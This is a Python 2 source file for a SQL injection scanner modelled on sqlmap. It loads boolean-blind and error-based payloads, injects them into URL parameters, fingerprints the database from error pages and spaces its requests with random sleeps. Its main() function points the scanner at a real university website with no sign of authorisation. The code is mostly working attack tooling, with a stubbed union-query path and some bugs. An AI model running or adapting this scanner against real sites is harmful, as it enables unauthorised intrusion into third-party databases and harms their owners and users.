#!/usr/bin/env python
# encoding: utf-8
"""
@author:     HHH
@date:       2015年04月01日
@description:
"""

import os
import re
import payloads
import random
import time
import string
import urlparse
import ctypes
import MyBrowserBase 
import urllib
import threading
from difflib import SequenceMatcher
from random import randint
import html
from MyThreadPool import WorkMag

# Minimum distance of ratio from kb.matchRatio to result in True
DIFF_TOLERANCE = 0.05
CONSTANT_RATIO = 0.9

# Ratio used in heuristic check for WAF/IDS/IPS protected targets
IDS_WAF_CHECK_RATIO = 0.5

# Lower and upper values for match ratio in case of stable page
LOWER_RATIO_BOUND = 0.02
UPPER_RATIO_BOUND = 0.98

 
STD_INPUT_HANDLE = -10
STD_OUTPUT_HANDLE= -11
STD_ERROR_HANDLE = -12
 
FOREGROUND_BLACK = 0x0
FOREGROUND_BLUE = 0x01 # text color contains blue.
FOREGROUND_GREEN= 0x02 # text color contains green.
FOREGROUND_RED = 0x04 # text color contains red.
FOREGROUND_INTENSITY = 0x08 # text color is intensified.
 
BACKGROUND_BLUE = 0x10 # background color contains blue.
BACKGROUND_GREEN= 0x20 # background color contains green.
BACKGROUND_RED = 0x40 # background color contains red.
BACKGROUND_INTENSITY = 0x80 # background color is intensified.

# colorful banner

# BANNER = """
#  ___ ___| |_____ ___ ___
# |_ -| . | |     | .'| . |
# |___|_  |_|_|_|_|__,|  _|
#       |_|           |_|
# """
# Alphabet used for heuristic checks
HEURISTIC_CHECK_ALPHABET = ('"', '\'', ')', '(', ',', '.')

class Color:
    ''' See http://msdn.microsoft.com/library/default.asp?url=/library/en-us/winprog/winprog/windows_api_reference.asp
    for information on Windows APIs. - www.sharejs.com'''
    std_out_handle = ctypes.windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)
     
    def __init__(self):
        self.mutex = threading.Lock()
        pass
        
    def set_cmd_color(self, color, handle=std_out_handle):
        """(color) -> bit
        Example: set_cmd_color(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)
        """
        bool = ctypes.windll.kernel32.SetConsoleTextAttribute(handle, color)
        return bool
     
    def reset_color(self):
        self.set_cmd_color(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE)
     
    def print_red_text(self, print_text):
        if self.mutex.acquire(1): 
            self.set_cmd_color(FOREGROUND_RED)
            print print_text
            self.reset_color()
            self.mutex.release()
            
    def print_green_text(self, print_text):
        if self.mutex.acquire(1): 
            self.set_cmd_color(FOREGROUND_GREEN)
            print print_text
            self.reset_color()
            self.mutex.release()
     
    def print_blue_text(self, print_text):
        if self.mutex.acquire(1): 
            self.set_cmd_color(FOREGROUND_BLUE)
            print print_text
            self.reset_color()
            self.mutex.release()
           
    def print_red_text_with_blue_bg(self, print_text):
        if self.mutex.acquire(1): 
            self.set_cmd_color(FOREGROUND_RED| BACKGROUND_BLUE | BACKGROUND_INTENSITY)
            print print_text
            self.reset_color() 
            self.mutex.release()
        
    def print_yellow_text(self,print_text):
        if self.mutex.acquire(1): 
            self.set_cmd_color(FOREGROUND_RED| FOREGROUND_GREEN)
            print print_text
            self.reset_color() 
            self.mutex.release()
    
    def print_Normal_text(self,print_text):
        if self.mutex.acquire(1): 
            print print_text
        self.mutex.release()
        
class Log:
    def __init__(self):
        self.Normal     = 0
        self.HEADER     = 1                                                        
        self.OKBLUE     = 2                                                       
        self.OKGREEN    = 3                                                    
        self.WARNING    = 4                                                    
        self.FAIL       = 5                                                         
        self.ENDC       = 6
        self.YELLOW     = 7
        self.Color = Color()
        pass
    
    def LogOut(self,Param,prefix,Colour):
        try:
            
            CurTime = time.strftime('%H:%M:%S',time.localtime(time.time()))
            LogInfo = '[%s] [%s] %s' % (CurTime,prefix,Param)
            if Colour == self.WARNING:
                self.Color.print_red_text(LogInfo)
            elif Colour == self.YELLOW:
                self.Color.print_yellow_text(LogInfo)
            elif Colour == self.Normal:
                self.Color.print_Normal_text(LogInfo)
            else:
                self.Color.print_green_text(LogInfo)
                
        except Exception,e:
            print 'LogOut Error:%s' % str(e)
        finally:
            pass
        pass
    

class MySQLInject(object):
    
    def __init__(self):
        try:
            self.PlayLoads  = []
            self.boundaries = []
            self.Color      = Color()
            self.Log        = Log()
            self.HTTPOp     = MyBrowserBase.BrowserBase()
            self.ErrorsData = ''
            self.MaxTimeout = 15
            self.InitPayloads()
            self.InitBoundaries()
            self.InitErrors()
            pass
        except Exception,e:
            print str(e)
        finally:
            pass
        
    def InitPayloads(self):
        try:
            PayLoadFileName = {'01_boolean_blind.xml'}
            self.PlayLoads = payloads.loadXML(PayLoadFileName)
            self.PlayLoads += payloads.loadXML({'02_error_based.xml'})
            #self.PlayLoads += payloads.loadXML({'06_union_query.xml'})
        except Exception,e:
            self.Log.LogOut('InitPayloads Error:%s' % str(e), 'Error', self.Log.WARNING)
        finally:
            pass
        pass
    
    def InitBoundaries(self):
        try:
            FileName = {'boundaries.xml'}
            self.boundaries = payloads.loadXML(FileName)
        except Exception,e:
            self.Log.LogOut('InitBoundaries Error:%s' % str(e), 'Error', self.Log.WARNING)
        finally:
            pass
        pass
    
    def InitErrors(self):
        try:
            FilePath = os.path.join("".join([os.path.split(os.path.realpath(__file__))[0], "\\payloads"]), 'errors.xml')
            self.ErrorsData = html.readCachedFileContent(FilePath)
        except Exception,e:
            self.Log.LogOut('InitErrors Error:%s' % str(e), 'Error', self.Log.WARNING)
        finally:
            pass
        pass
    
    def randomStr(self,length=4, lowercase=False, alphabet=None, seed=None):
        try:
            retVal = ''
            choice = random.WichmannHill(seed).choice if seed is not None else random.choice
            
            if alphabet:
                retVal = "".join(choice(alphabet) for _ in xrange(0, length))
            elif lowercase:
                retVal = "".join(choice(string.ascii_lowercase) for _ in xrange(0, length))
            else:
                retVal = "".join(choice(string.ascii_letters) for _ in xrange(0, length))
    
        except Exception,e:
            ErrInfo = 'CleanPayload::randomStr Error:%s' % str(e)
            self.Log.LogOut(ErrInfo, 'Error', self.Log.WARNING)
        finally:
            return retVal
            
    def CleanPayload(self,Payload):
        
        AdditionalParam = {}
                
        try:
            if Payload is None:
                Payload = ''
            
            for _ in set(re.findall(r"\[RANDNUM(?:\d+)?\]", Payload, re.I)):
                Payload = Payload.replace(_, str(random.randint(1000,5000)))
                
            for _ in set(re.findall(r"\[RANDSTR(?:\d+)?\]", Payload, re.I)):
                RandStr = self.randomStr()
                AdditionalParam.setdefault('RandStr',RandStr)
                Payload = Payload.replace(_, RandStr)
            
            for _ in set(re.findall(r"\[DELIMITER_START(?:\d+)?\]", Payload, re.I)):
                DELIMITER_START = self.randomStr()
                AdditionalParam.setdefault('DELIMITER_START',DELIMITER_START)
                Payload = Payload.replace(_, DELIMITER_START)
            
            for _ in set(re.findall(r"\[DELIMITER_STOP(?:\d+)?\]", Payload, re.I)):
                DELIMITER_STOP = self.randomStr()
                AdditionalParam.setdefault('DELIMITER_STOP',DELIMITER_STOP)
                Payload = Payload.replace(_, DELIMITER_STOP)
                 
            for _ in set(re.findall(r"\[SLEEPTIME\]", Payload, re.I)):
                SleepTime = randint(5,10)
                AdditionalParam.setdefault('SLEEPTIME',SleepTime)
                Payload = Payload.replace(_,str(SleepTime))
                
            #"[AT_REPLACE]""[SPACE_REPLACE]""[DOLLAR_REPLACE]""[HASH_REPLACE]"
                
        except Exception,e:
            self.Log.LogOut('CleanPayload Error:%s' % str(e), 'Error', self.Log.WARNING)
        finally:
            return Payload,AdditionalParam
        pass
    
    def ExtractTextTagContent(self,PageData):
        try:
            ResList = []
            List = PageData.split('\n')
            if len(List) > 1:
                for SubStr in List:
                    ResList += self.ExtractTextTagContent(SubStr)
            else:
                ResList = List
        except Exception,e:
            print str(e)
        finally:
            return ResList
            pass

    def Comparison(self,seq1,seq2):
        try:
            seqMatcher = SequenceMatcher()
            ratio = 0.0
            count = 0
            while count < min(len(seq1), len(seq2)):
                if seq1[count] == seq2[count]:
                    count += 1
                else:
                    break
            if count:
                seq1 = seq1[count:]
                seq2 = seq2[count:]
    
            while True:
                try:
                    seqMatcher.set_seq1(seq1)
                except MemoryError:
                    seq1 = seq1[:len(seq1) / 1024]
                else:
                    break
    
            while True:
                try:
                    seqMatcher.set_seq2(seq2)
                except MemoryError:
                    seq2 = seq2[:len(seq2) / 1024]
                else:
                    break
    
            ratio = round(seqMatcher.quick_ratio(), 3)
        
        except Exception,e:
            self.Log.LogOut('Comparison Error:%s' % str(e), 'Error', self.Log.WARNING)
        finally:
            if ratio >= LOWER_RATIO_BOUND and ratio <= UPPER_RATIO_BOUND:
                return False
    
            elif ratio > UPPER_RATIO_BOUND:
                return True
            
            else:
                return None
        pass
    
    def UrlParamSplit(self,URL):
        try:
            URLRes = {}
            UrlSplitRes = urlparse.urlparse(URL)
            URLRes.setdefault('AAAA',URL.split('?')[0])
            URLRes.setdefault('Params',[])
            #URLRes.setdefault('Params',urlparse.parse_qs(UrlSplitRes.query,True))
            
            for ParamInfo in UrlSplitRes.query.split('&'):
                ParamDir = {}
                if '=' in ParamInfo:
                    Name,Val = ParamInfo.split('=')
                    ParamDir.setdefault('Param',Name)
                    ParamDir.setdefault('Val',Val)
                    URLRes['Params'].append(ParamDir)
                else:
                    URLRes = None
                    break
        except Exception,e:
            self.Log.LogOut('UrlParamSplit Error:%s' % str(e), 'Error', self.Log.WARNING)
        finally:
            return URLRes
            pass
        
    
    def CreateNewUrl(self,UrlDir,ReplaceParam,Payload):
        try:
            nFirst = True
            NewUrl = ''
            NewUrl += UrlDir['AAAA']
            if len(UrlDir) > 1:
                NewUrl += '?'
                
                for ParamInfo in UrlDir['Params']:
                    ParamName = ParamInfo['Param']
                    ValStr = ParamInfo['Val']
                    if ParamName == ReplaceParam:
                        ValStr += Payload
                    
                    if nFirst is True:
                        nFirst = False
                    else:
                        NewUrl += '&'
                        
                    NewUrl += ParamName
                    NewUrl += '='
                    NewUrl += ValStr
                    
                        
        except Exception,e:
            self.Log.LogOut('MySQLInject::CreateNewUrl Error:%s' % (str(e)), 'Error', self.Log.WARNING)
        finally:
            return NewUrl
        
    def extractRegexResult(self,regex, content, flags=0):
        
        retVal = None
    
        if regex and content and "?P<result>" in regex:
            match = re.search(regex, content, flags)
    
            if match:
                retVal = match.group("result")
    
        return retVal
    
    def IsSkipBoundarie(self,test,boundary):
        try:
            clauseMatch = True
            Res = False
            if hasattr(test, 'clause') and hasattr(boundary, 'clause'):
                for clauseTest in test.clause:
                    if clauseTest in boundary.clause:
                        clauseMatch = True
                        break
                
                if test.clause != [0] and boundary.clause != [0] and not clauseMatch:
                    Res = True
                
        except Exception,e:
            self.Log.LogOut('IsSkipBoundarie Error:%s' % str(e), 'Error', self.Log.WARNING)
        finally:
            return Res
    #基于布尔类型盲注
    def CheckBooleanBlind(self,PayloadInfo,CheckURL,level):
        
        try:
            Param   = ''
            prefix  = ''
            suffix  = ''
            
            IsSQLInject     = False
            nTimeOutCount   = 0
            ChcekRes = {}
            AdditionalParam = {}
            Payload,AdditionalParam     = self.CleanPayload(PayloadInfo.request.payload)
            OrgPage = self.HTTPOp.GetPageSource(CheckURL)
            
            def GetCMDPayload():
                rePayload,Param =  self.CleanPayload(PayloadInfo.response.comparison)
                return prefix + ' ' + rePayload + suffix
            
            UrlRes = self.UrlParamSplit(CheckURL)
            if UrlRes is not None:
                for Boundarie in self.boundaries:
                    if Boundarie.level > level or self.IsSkipBoundarie(PayloadInfo,Boundarie):
                        continue
                    
                    prefix,AdditionalParam = self.CleanPayload(Boundarie.prefix)
                    suffix,AdditionalParam = self.CleanPayload(Boundarie.suffix)
                    Payload = prefix + ' ' + Payload + suffix
                    for Param in UrlRes['Params']:
                        TestUrl     = self.CreateNewUrl(UrlRes, Param['Param'], urllib.quote(Payload))
                        TestData    = self.HTTPOp.GetPageSource(TestUrl)
                            
                        if TestData['GetRes'] != '200':
                            nTimeOutCount += 1
                            self.Log.LogOut('Unable to connect to the target URL', 'Error', self.Log.WARNING)
                        else:
                            
                            if self.Comparison(TestData['PageData'], OrgPage['PageData']) is True:
                                CmpURL      = self.CreateNewUrl(UrlRes, Param['Param'],urllib.quote(GetCMDPayload()))
                                CMPPage     = self.HTTPOp.GetPageSource(CmpURL)
                                if CMPPage['GetRes'] != '200':
                                    nTimeOutCount += 1
                                    self.Log.LogOut('Unable to connect to the target URL', 'Error', self.Log.WARNING)
                                else:
                                    if self.Comparison(CMPPage['PageData'],TestData['PageData']) is False:
                                        IsSQLInject = True
                                        ChcekRes.setdefault('InjectParam',Param['Param'])
                                        ChcekRes.setdefault('rePayload',Payload)
                                        ChcekRes.setdefault('PayloadInfo',PayloadInfo)
                                        ChcekRes.setdefault('Boundarie',Boundarie)
                                        ChcekRes.setdefault('Url',TestUrl)
                                        break
                            
                        time.sleep(randint(1,5))
                        if nTimeOutCount >= self.MaxTimeout:
                            break    
                    
                    if IsSQLInject is True or nTimeOutCount >= self.MaxTimeout:
                        break

        except Exception,e:
            self.Log.LogOut('CheckBooleanBlind Error:%s' % str(e), self.Log.WARNING)
        finally:
            ChcekRes.setdefault('IsSQLInject',IsSQLInject)
            return ChcekRes,nTimeOutCount
    
    #基于错误的盲注
    def CheckErrorBased(self,PayloadInfo,CheckURL,level):
                
        try:
            Param = ''
            IsSQLInject     = False
            nTimeOutCount   = 0
            ChcekRes = {}
            Grep    = PayloadInfo.response.grep

            RStr_1  = self.randomStr()
            RStr_2  = self.randomStr()
            UrlRes  = self.UrlParamSplit(CheckURL)
            Payload = PayloadInfo.request.payload
            
            for _ in set(re.findall(r'\[DELIMITER_START\]', PayloadInfo.response.grep, re.I)):
                Payload = Payload.replace(_,RStr_1)
            
            for _ in set(re.findall('\[DELIMITER_STOP\]', PayloadInfo.response.grep, re.I)):
                Payload = Payload.replace(_,RStr_2)
                             
            Payload,A = self.CleanPayload(Payload)   
            if UrlRes is not None:
                
                for Boundarie in self.boundaries:
                    if Boundarie.level > level or self.IsSkipBoundarie(PayloadInfo,Boundarie):
                        continue
                    
                    prefix,prefixlParam = self.CleanPayload(Boundarie.prefix)
                    suffix,suffixParam = self.CleanPayload(Boundarie.suffix)
                    Payload = prefix + ' ' + Payload + suffix
                    for Param in UrlRes['Params']:
                        NewUrl     = self.CreateNewUrl(UrlRes, Param['Param'], urllib.quote(Payload))
                        PageData   = self.HTTPOp.GetPageSource(NewUrl)
                        if PageData['GetRes'] != '200':
                            nTimeOutCount += 1
                            self.Log.LogOut('Unable to connect to the target URL', 'Error', self.Log.WARNING)
                        else:
                            for _ in set(re.findall('\[DELIMITER_START\]', PayloadInfo.response.grep, re.I)):
                                Grep = Grep.replace(_,RStr_1)
                                
                            for _ in set(re.findall('\[DELIMITER_STOP\]', PayloadInfo.response.grep, re.I)):
                                Grep = Grep.replace(_,RStr_2)
                                  
                            FindRes = self.extractRegexResult(Grep,PageData['PageData'])
                            if FindRes is not None and FindRes == '1':
                                IsSQLInject = True
                                ChcekRes.setdefault('InjectParam',Param['Param'])
                                ChcekRes.setdefault('rePayload',Payload)
                                ChcekRes.setdefault('PayloadInfo',PayloadInfo)
                                ChcekRes.setdefault('Boundarie',Boundarie)
                                ChcekRes.setdefault('Url',NewUrl)
                                break
                        
                        if nTimeOutCount >= self.MaxTimeout or IsSQLInject is True:
                            break
                        
                        time.sleep(randint(1,3))
                    
                    if nTimeOutCount >= self.MaxTimeout or IsSQLInject is True:
                        break
                
        except Exception,e:
            self.Log.LogOut('CheckErrorBased Error:%s' % str(e), 'Run Error', self.Log.WARNING)
        finally:
            ChcekRes.setdefault('IsSQLInject',IsSQLInject)
            return ChcekRes,nTimeOutCount
    
    def CheckUnionQuery(self,PayloadInfo,CheckURL,level):
        try:
            BRes = {}
            IsSQLInject = False
        except Exception,e:
            self.Log.LogOut('CheckUnionQuery: Error:%s' % str(e),'Error',self.Log.WARNING)
        finally:
            BRes.setdefault('IsSQLInject',IsSQLInject)
            return BRes
        
    def heuristicCheckSqlInjection(self,Url):
        try:
            Res = {}
            randStr = ""

            while '\'' not in randStr:
                randStr = self.randomStr(length=10, alphabet=HEURISTIC_CHECK_ALPHABET)
                
            CheckUrl = Url + randStr
            Page = self.HTTPOp.GetPageSource(CheckUrl)
            if Page['GetRes'] == '200':
                dbms = html.htmlParser(Page['PageData'],self.ErrorsData)
                if dbms is not None:
                    Res.setdefault('dbms',dbms.encode('utf-8'))
                else:
                    Res.setdefault('dbms',dbms)
                
            else:
                Res.setdefault('dbms',None)
                
        except Exception,e:
            self.Log.LogOut('heuristicCheckSqlInjection Error:%s' % str(e), 'Error', self.Log.WARNING)
        finally:
            return Res
            pass
        
    def ConnectTest(self,Url):
        try:
            Res = False
            Page = self.HTTPOp.GetPageSource(Url)
            if Page['GetRes'] == '200':
                Res = True
        except Exception,e:
            pass
        finally:
            return Res
        
    def CheckSQLInject(self,Url,Model = 'GET',level = 3,risk = 1,nMaxHttpErroCount = 15,nThreadCount = 5):
        try:
            vul_info = {"is_sql_inject": False, "vul_type": "unknow", "vul_detail": "unknow", "vul_url": "unknow"}
            BRes = None
            WM = WorkMag()
            self.MaxTimeout = nMaxHttpErroCount
            # self.Log.LogOut('%s\n[*] starting at %s\n\n' % (BANNER,time.strftime("%X")), '', self.Log.YELLOW)
            self.Log.LogOut('[*] starting at %s\n\n' % (time.strftime("%X")), '', self.Log.YELLOW)
            heuristicInfo = self.heuristicCheckSqlInjection(Url)
            if heuristicInfo['dbms'] is not None:
                self.Log.LogOut('Target seems to be %s' % heuristicInfo['dbms'], 'INFO', self.Log.OKGREEN)
                
            if 'GET' in Model and '?' in Url:
                for Check in self.PlayLoads:
                    if Check.level <= level:
                        if heuristicInfo['dbms'] is not None:
                            if Check.details.dbms != heuristicInfo['dbms'] and Check.details.dbms != '-' or Check.risk > risk:
                                continue
                            
                        WM.Add_Work(SQLCallBale,(self,Check,Url,level))
                
                WM.Start(nThreadCount)
                WM.WaitForComlete()
                BRes = WM.Get_Result()
                
                if BRes is not None and BRes['IsSQLInject'] is True:
                    self.Log.LogOut('\n-------\nParameter:%s is Inject!\nType: %s\nPayLoad:%s\n-------' \
                    %(BRes['InjectParam'],BRes['PayloadInfo'].title,BRes['rePayload']), 'INFO', self.Log.Normal)
                    vul_info["is_sql_inject"] = True
                    vul_info["vul_type"] = "sqlinject"
                    vul_info["vul_detail"] = "[%s] [%s]" % (BRes['rePayload'], BRes['PayloadInfo'].title)
                    vul_info["vul_url"] = BRes["Url"]
                else:
                    BRes = {}
                    BRes.setdefault('IsSQLInject',False)
            else:
                BRes = {}
                BRes.setdefault('IsSQLInject',False)
                
        except Exception,e:
            self.Log.LogOut('CheckSQLInject Error:%s'%str(e), 'Error', self.Log.WARNING)
        finally:
            self.Log.LogOut("\n[*] shutting down at %s\n\n" % time.strftime("%X"), '', self.Log.YELLOW)
            # return BRes
            return vul_info
        
        
    def Test1(self,Url,Model = 'GET',level = 3,risk = 1,nMaxHttpErroCount = 3,nThreadCount = 10):
        try:
            BRes = {}
            nTimeOut    = 0
            
            self.MaxTimeout = nMaxHttpErroCount
            # self.Log.LogOut('%s\n[*] starting at %s\n\n' % (BANNER,time.strftime("%X")), '', self.Log.YELLOW)
            self.Log.LogOut('[*] starting at %s\n\n' % (time.strftime("%X")), '', self.Log.YELLOW)
            
            heuristicInfo = self.heuristicCheckSqlInjection(Url)
            
            if 'GET' in Model and '?' in Url:
                for Check in self.PlayLoads:
                    if Check.level <= level:
                        if heuristicInfo['dbms'] is not None:
                            if Check.details.dbms != heuristicInfo['dbms'] and Check.details.dbms != '-' or Check.risk > risk:
                                continue
                            
                        self.Log.LogOut('\'Testing %s \'' % Check.title,'INFO',self.Log.OKGREEN)
                            
                        #基于布尔类型的盲注
                        if 'comparison' in Check.response:
                            BRes.setdefault('IsSQLInject',False)
                            #BRes,nTimeOut = self.CheckBooleanBlind(Check,Url,level)
                            
                        #基于错误的盲注
                        elif 'grep' in Check.response:
                            BRes,nTimeOut = self.CheckErrorBased(Check, Url,level)
                        
                        if BRes['IsSQLInject'] is True:
                            self.Log.LogOut('\n-------\nParameter:%s\nType: %s\nPayLoad:%s\n-------' \
                                            %(BRes['InjectParam'],BRes['PayloadInfo'].title,BRes['rePayload']), 'INFO', self.Log.Normal)
                        #break
                        
                        if nTimeOut >= self.MaxTimeout:
                            break
                
        except Exception,e:
            self.Log.LogOut('CheckSQLInject Error:%s'%str(e), 'Error', self.Log.WARNING)
        finally:
            self.Log.LogOut("\n[*] shutting down at %s\n\n" % time.strftime("%X"), '', self.Log.YELLOW)
            return BRes
    
def SQLCallBale(SQLCheck,Check,Url,level):
    try:
        time.sleep(randint(1,5))
        
        BRes = {}
        nTimeOut = 0
        SQLCheck.Log.LogOut('\'Testing %s \'' % Check.title,'INFO',SQLCheck.Log.OKGREEN)
        
        #基于布尔类型的盲注
        if 'comparison' in Check.response:
            #BRes.setdefault('IsSQLInject',False)
            BRes,nTimeOut = SQLCheck.CheckBooleanBlind(Check,Url,level)
            
        #基于错误的盲注
        elif 'grep' in Check.response:
            #BRes.setdefault('IsSQLInject',False)
            BRes,nTimeOut = SQLCheck.CheckErrorBased(Check, Url,level)
                
        elif 'Havij' in Check.response:
            BRes.setdefault('IsSQLInject',False)
            BRes,nTimeOut = SQLCheck.CheckUnionQuery(Check, Url,level)
            
        else:
            BRes.setdefault('IsSQLInject',False)
            
         
    except Exception,e:
        print str(e)
    finally:
        if BRes['IsSQLInject'] is True or nTimeOut >= SQLCheck.MaxTimeout:
            return BRes
        else:
            return None
        pass
        
def checkSqlInjection(Url):
    try:
        RetRes = None
        SQL = MySQLInject()
        Res = SQL.CheckSQLInject(Url)
        if Res['IsSQLInject'] is True:
            RetRes = {}
            RetRes.setdefault('vul_type',Res['PayloadInfo'].title)
            RetRes.setdefault('vul_detail',Res['rePayload'])
            RetRes.setdefault('vul_url',Url)
    except Exception,e:
        pass
    finally:
        return RetRes
    
def main():
    try:
        SQL = MySQLInject()
        vul_info = SQL.CheckSQLInject('http://www.unom.ac.in/index.php?route=department/department/scholars&deptid=61')
        if vul_info['IsSQLInject'] is True:
            print 'vul_type    :%s' % vul_info['vul_type']
            print 'vul_detail :%s' % vul_info['vul_detail']
            print 'vul_url   :%s' % vul_info['vul_url']
            
        os.system('pause')
        pass
    except Exception,e:
        print str(e)
    finally:
        pass
    pass

if __name__ == '__main__':
    main()